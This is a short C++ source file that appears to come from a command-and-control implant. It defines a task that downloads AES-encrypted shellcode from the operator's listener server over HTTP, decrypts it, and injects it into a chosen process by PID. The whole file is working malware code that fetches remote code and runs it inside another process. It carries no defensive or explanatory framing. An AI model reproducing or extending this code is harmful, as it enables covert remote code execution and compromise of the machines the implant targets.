#include "core/task.hpp"

namespace Task
{
     std::wstring Shellcode(State::PSTATE pState, const std::wstring& wPid, const std::wstring& wSrc)
     {
        DWORD dwPid = Utils::Convert::WstringToDWORD(wPid, 10);
        std::string sSrc = Utils::Convert::UTF8Encode(wSrc);

        std::wstring wHeaders = L"X-UUID: " + pState->wUUID + L"\r\n";

        // Download shellcode
		System::Http::WinHttpResponse resp = System::Http::SendRequest(
            pState->pProcs,
			pState->hConnect,
			pState->lpListenerHost,
			pState->nListenerPort,
			pState->lpReqPathDownload,
			L"POST",
			wHeaders.c_str(),
			(LPVOID)sSrc.c_str(),
			(DWORD)strlen(sSrc.c_str())
		);
		if (!resp.bResult || resp.dwStatusCode != 200)
		{
			return L"Error: Failed to download shellcode.";
		}

        std::wstring wEnc = System::Http::ReadResponseText(pState->pProcs, resp.hRequest);
        if (wEnc.length() == 0)
            return L"Error: Failed to read response.";

        // Decrypt the data
        std::vector<BYTE> bytes = Crypt::Decrypt(
            wEnc,
            pState->pCrypt->pAES->hKey,
            pState->pCrypt->pAES->iv
        );

        // Inject shellcode
        if (!Technique::Injection::ShellcodeInjection(dwPid, bytes))
        {
            return L"Error: Failed to inject shellcode.";
        }

        return L"Success: Shellcode injected successfully.";
     }
}